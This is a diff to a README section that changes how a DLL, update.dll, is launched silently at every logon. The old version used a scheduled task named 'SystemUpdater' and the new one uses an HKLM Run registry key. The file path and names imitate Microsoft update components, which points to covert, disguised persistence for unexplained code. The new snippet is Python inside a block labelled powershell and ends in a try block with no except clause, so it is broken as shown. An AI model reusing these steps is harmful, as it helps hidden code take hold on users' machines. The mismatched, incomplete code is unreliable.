@@ -99,23 +99,27 @@ msvcrt.getch()
 
 ---
 
-## 🚀 Autostart via Task Scheduler
+## 🚀 Autostart via Registry Key
 
 The DLL is silently triggered at each user logon.
 
-### ▶ Add Startup Task
+### ▶ Add Startup Registry Key
 
 ```powershell
-$Action = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument '"C:\ProgramData\Microsoft\CacheSync\update.dll",MyFunction'
-$Trigger = New-ScheduledTaskTrigger -AtLogOn
-$Principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Limited
-Register-ScheduledTask -TaskName "SystemUpdater" -Action $Action -Trigger $Trigger -Principal $Principal
+def setup_registry_autostart():
+    dll_path = os.path.join(TARGET_DIR, DLL_NAME)
+    rundll_command = f'rundll32.exe "{dll_path}",MyFunction'
+    try:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+                            0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, rundll_command)
 ```
 
-### ❌ Remove Startup Task
+### ❌ Remove Startup Registry Key
 
 ```powershell
-Unregister-ScheduledTask -TaskName "SystemUpdater" -Confirm:$false
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdater" -ErrorAction SilentlyContinue
 ```
 
 ---
